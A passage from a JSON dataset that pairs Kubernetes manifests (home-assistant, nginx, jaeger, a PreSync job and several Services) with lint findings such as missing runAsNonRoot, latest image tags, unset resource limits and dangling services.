path: /-/status\n            port: http\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        volumeMounts:\n        - name: nginx-config\n          mountPath: /etc/nginx/nginx.conf\n          subPath: nginx.conf\n      - name: home-assistant\n        image: homeassistant/home-assistant:0.107.4\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: api\n          containerPort: 8124\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 180\n          failureThreshold: 5\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 60\n          failureThreshold: 5\n          timeoutSeconds: 10\n        volumeMounts:\n        - mountPath: /config\n          name: config-data\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n      volumes:\n      - name: config-data\n        persistentVolumeClaim:\n          claimName: homeassistant-data-pvc\n      - name: nginx-config\n        configMap:\n          name: home-assistant-nginx-config\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10857",
    "manifest_path": "data/manifests/the_stack_sample/sample_4172.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: home-assistant\n  namespace: internet-of-things\n  labels:\n    app.kubernetes.io/name: home-assistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: home-assistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: home-assistant\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.8-alpine\n        ports:\n        - name: http\n          containerPort: 8123\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        volumeMounts:\n        - name: nginx-config\n          mountPath: /etc/nginx/nginx.conf\n          subPath: nginx.conf\n      - name: home-assistant\n        image: homeassistant/home-assistant:0.107.4\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: api\n          containerPort: 8124\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 180\n          failureThreshold: 5\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 60\n          failureThreshold: 5\n          timeoutSeconds: 10\n        volumeMounts:\n        - mountPath: /config\n          name: config-data\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n      volumes:\n      - name: config-data\n        persistentVolumeClaim:\n          claimName: homeassistant-data-pvc\n      - name: nginx-config\n        configMap:\n          name: home-assistant-nginx-config\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"home-assistant\" is not set to runAsNonRoot"
  },
  {
    "id": "10858",
    "manifest_path": "data/manifests/the_stack_sample/sample_4172.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: home-assistant\n  namespace: internet-of-things\n  labels:\n    app.kubernetes.io/name: home-assistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: home-assistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: home-assistant\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.8-alpine\n        ports:\n        - name: http\n          containerPort: 8123\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        volumeMounts:\n        - name: nginx-config\n          mountPath: /etc/nginx/nginx.conf\n          subPath: nginx.conf\n      - name: home-assistant\n        image: homeassistant/home-assistant:0.107.4\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: api\n          containerPort: 8124\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 180\n          failureThreshold: 5\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 60\n          failureThreshold: 5\n          timeoutSeconds: 10\n        volumeMounts:\n        - mountPath: /config\n          name: config-data\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n      volumes:\n      - name: config-data\n        persistentVolumeClaim:\n          claimName: homeassistant-data-pvc\n      - name: nginx-config\n        configMap:\n          name: home-assistant-nginx-config\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10859",
    "manifest_path": "data/manifests/the_stack_sample/sample_4173.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: siteconfig-pre\n  namespace: clusters-sub\n  annotations:\n    argocd.argoproj.io/hook: PreSync\n    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation\nspec:\n  template:\n    spec:\n      containers:\n      - name: ztp-site-generator\n        image: quay.io/redhat_emp1/ztp-site-generator:latest\n        command:\n        - /bin/bash\n        - pre-sync-entrypoint.sh\n  ttlSecondsAfterFinished: 60\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ztp-site-generator\" is using an invalid container image, \"quay.io/redhat_emp1/ztp-site-generator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10860",
    "manifest_path": "data/manifests/the_stack_sample/sample_4173.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: siteconfig-pre\n  namespace: clusters-sub\n  annotations:\n    argocd.argoproj.io/hook: PreSync\n    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation\nspec:\n  template:\n    spec:\n      containers:\n      - name: ztp-site-generator\n        image: quay.io/redhat_emp1/ztp-site-generator:latest\n        command:\n        - /bin/bash\n        - pre-sync-entrypoint.sh\n  ttlSecondsAfterFinished: 60\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ztp-site-generator\" does not have a read-only root file system"
  },
  {
    "id": "10861",
    "manifest_path": "data/manifests/the_stack_sample/sample_4173.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: siteconfig-pre\n  namespace: clusters-sub\n  annotations:\n    argocd.argoproj.io/hook: PreSync\n    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation\nspec:\n  template:\n    spec:\n      containers:\n      - name: ztp-site-generator\n        image: quay.io/redhat_emp1/ztp-site-generator:latest\n        command:\n        - /bin/bash\n        - pre-sync-entrypoint.sh\n  ttlSecondsAfterFinished: 60\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ztp-site-generator\" is not set to runAsNonRoot"
  },
  {
    "id": "10862",
    "manifest_path": "data/manifests/the_stack_sample/sample_4173.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: siteconfig-pre\n  namespace: clusters-sub\n  annotations:\n    argocd.argoproj.io/hook: PreSync\n    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation\nspec:\n  template:\n    spec:\n      containers:\n      - name: ztp-site-generator\n        image: quay.io/redhat_emp1/ztp-site-generator:latest\n        command:\n        - /bin/bash\n        - pre-sync-entrypoint.sh\n  ttlSecondsAfterFinished: 60\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ztp-site-generator\" has cpu request 0"
  },
  {
    "id": "10863",
    "manifest_path": "data/manifests/the_stack_sample/sample_4173.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: siteconfig-pre\n  namespace: clusters-sub\n  annotations:\n    argocd.argoproj.io/hook: PreSync\n    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation\nspec:\n  template:\n    spec:\n      containers:\n      - name: ztp-site-generator\n        image: quay.io/redhat_emp1/ztp-site-generator:latest\n        command:\n        - /bin/bash\n        - pre-sync-entrypoint.sh\n  ttlSecondsAfterFinished: 60\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ztp-site-generator\" has memory limit 0"
  },
  {
    "id": "10864",
    "manifest_path": "data/manifests/the_stack_sample/sample_4175.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: kube-public\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n        linkerd.io/auto-inject: disabled\n      annotations:\n        created-by: isim\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - name: http\n          containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10865",
    "manifest_path": "data/manifests/the_stack_sample/sample_4175.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: kube-public\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n        linkerd.io/auto-inject: disabled\n      annotations:\n        created-by: isim\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - name: http\n          containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10866",
    "manifest_path": "data/manifests/the_stack_sample/sample_4175.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: kube-public\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n        linkerd.io/auto-inject: disabled\n      annotations:\n        created-by: isim\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - name: http\n          containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10867",
    "manifest_path": "data/manifests/the_stack_sample/sample_4175.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: kube-public\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n        linkerd.io/auto-inject: disabled\n      annotations:\n        created-by: isim\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - name: http\n          containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10868",
    "manifest_path": "data/manifests/the_stack_sample/sample_4175.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: kube-public\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n        linkerd.io/auto-inject: disabled\n      annotations:\n        created-by: isim\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - name: http\n          containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10869",
    "manifest_path": "data/manifests/the_stack_sample/sample_4176.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\nspec:\n  replicas: 1\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sise\" is using an invalid container image, \"docker4jp/simpleservice:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10870",
    "manifest_path": "data/manifests/the_stack_sample/sample_4176.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\nspec:\n  replicas: 1\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sise\" does not have a read-only root file system"
  },
  {
    "id": "10871",
    "manifest_path": "data/manifests/the_stack_sample/sample_4176.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\nspec:\n  replicas: 1\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sise\" is not set to runAsNonRoot"
  },
  {
    "id": "10872",
    "manifest_path": "data/manifests/the_stack_sample/sample_4176.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\nspec:\n  replicas: 1\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sise\" has cpu request 0"
  },
  {
    "id": "10873",
    "manifest_path": "data/manifests/the_stack_sample/sample_4176.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\nspec:\n  replicas: 1\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sise\" has memory limit 0"
  },
  {
    "id": "10874",
    "manifest_path": "data/manifests/the_stack_sample/sample_4179.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: hasura\n  name: hasura\n  namespace: essential-genes-dev\nspec:\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n  selector:\n    app: hasura\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:hasura])"
  },
  {
    "id": "10875",
    "manifest_path": "data/manifests/the_stack_sample/sample_4181.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-icmp-responder:c862d09\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          limits:\n            memory: 20Mi\n            cpu: 100m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nse\" does not have a read-only root file system"
  },
  {
    "id": "10876",
    "manifest_path": "data/manifests/the_stack_sample/sample_4181.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-icmp-responder:c862d09\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          limits:\n            memory: 20Mi\n            cpu: 100m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nse\" is not set to runAsNonRoot"
  },
  {
    "id": "10877",
    "manifest_path": "data/manifests/the_stack_sample/sample_4181.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-icmp-responder:c862d09\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          limits:\n            memory: 20Mi\n            cpu: 100m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nse\" has cpu request 0"
  },
  {
    "id": "10878",
    "manifest_path": "data/manifests/the_stack_sample/sample_4182.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jaeger\n  template:\n    metadata:\n      labels:\n        app: jaeger\n    spec:\n      containers:\n      - name: jaeger\n        image: jaegertracing/all-in-one\n        env:\n        - name: COLLECTOR_ZIPKIN_HTTP_PORT\n          value: '9411'\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 16686\n          protocol: TCP\n        - containerPort: 9411\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 14269\n          initialDelaySeconds: 5\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jaeger\" is using an invalid container image, \"jaegertracing/all-in-one\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10879",
    "manifest_path": "data/manifests/the_stack_sample/sample_4182.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jaeger\n  template:\n    metadata:\n      labels:\n        app: jaeger\n    spec:\n      containers:\n      - name: jaeger\n        image: jaegertracing/all-in-one\n        env:\n        - name: COLLECTOR_ZIPKIN_HTTP_PORT\n          value: '9411'\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 16686\n          protocol: TCP\n        - containerPort: 9411\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 14269\n          initialDelaySeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jaeger\" does not have a read-only root file system"
  },
  {
    "id": "10880",
    "manifest_path": "data/manifests/the_stack_sample/sample_4182.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jaeger\n  template:\n    metadata:\n      labels:\n        app: jaeger\n    spec:\n      containers:\n      - name: jaeger\n        image: jaegertracing/all-in-one\n        env:\n        - name: COLLECTOR_ZIPKIN_HTTP_PORT\n          value: '9411'\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 16686\n          protocol: TCP\n        - containerPort: 9411\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 14269\n          initialDelaySeconds: 5\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"jaeger\" does not expose port 14269 for the HTTPGet"
  },
  {
    "id": "10881",
    "manifest_path": "data/manifests/the_stack_sample/sample_4182.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jaeger\n  template:\n    metadata:\n      labels:\n        app: jaeger\n    spec:\n      containers:\n      - name: jaeger\n        image: jaegertracing/all-in-one\n        env:\n        - name: COLLECTOR_ZIPKIN_HTTP_PORT\n          value: '9411'\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 16686\n          protocol: TCP\n        - containerPort: 9411\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 14269\n          initialDelaySeconds: 5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jaeger\" is not set to runAsNonRoot"
  },
  {
    "id": "10882",
    "manifest_path": "data/manifests/the_stack_sample/sample_4182.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jaeger\n  template:\n    metadata:\n      labels:\n        app: jaeger\n    spec:\n      containers:\n      - name: jaeger\n        image: jaegertracing/all-in-one\n        env:\n        - name: COLLECTOR_ZIPKIN_HTTP_PORT\n          value: '9411'\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 16686\n          protocol: TCP\n        - containerPort: 9411\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 14269\n          initialDelaySeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jaeger\" has cpu request 0"
  },
  {
    "id": "10883",
    "manifest_path": "data/manifests/the_stack_sample/sample_4182.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jaeger\n  template:\n    metadata:\n      labels:\n        app: jaeger\n    spec:\n      containers:\n      - name: jaeger\n        image: jaegertracing/all-in-one\n        env:\n        - name: COLLECTOR_ZIPKIN_HTTP_PORT\n          value: '9411'\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 16686\n          protocol: TCP\n        - containerPort: 9411\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 14269\n          initialDelaySeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jaeger\" has memory limit 0"
  },
  {
    "id": "10884",
    "manifest_path": "data/manifests/the_stack_sample/sample_4183.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: worker\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - image: lucj/voting:worker\n        name: worker\n        resources:\n          limits:\n            cpu: 80m\n            memory: 128Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"worker\" does not have a read-only root file system"
  },
  {
    "id": "10885",
    "manifest_path": "data/manifests/the_stack_sample/sample_4183.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: worker\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - image: lucj/voting:worker\n        name: worker\n        resources:\n          limits:\n            cpu: 80m\n            memory: 128Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"worker\" is not set to runAsNonRoot"
  },
  {
    "id": "10886",
    "manifest_path": "data/manifests/the_stack_sample/sample_4185.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: cheese\n  namespace: blah\n  labels:\n    chart: cheese\nspec:\n  ports:\n  - port: 80\n    targetPort: 8080\n    protocol: TCP\n    name: http\n  selector:\n    app: cheese\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cheese])"
  },
  {
    "id": "10887",
    "manifest_path": "data/manifests/the_stack_sample/sample_4186.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: authentication\n  namespace: social-network\n  labels:\n    stage: production\n    name: authentication\n    app: social-network\nspec:\n  ports:\n  - port: 5000\n    targetPort: 5000\n    protocol: TCP\n  selector:\n    app: social-network\n    name: authentication\n    stage: production\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:social-network name:authentication stage:production])"
  },
  {
    "id": "10888",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10889",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10890",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
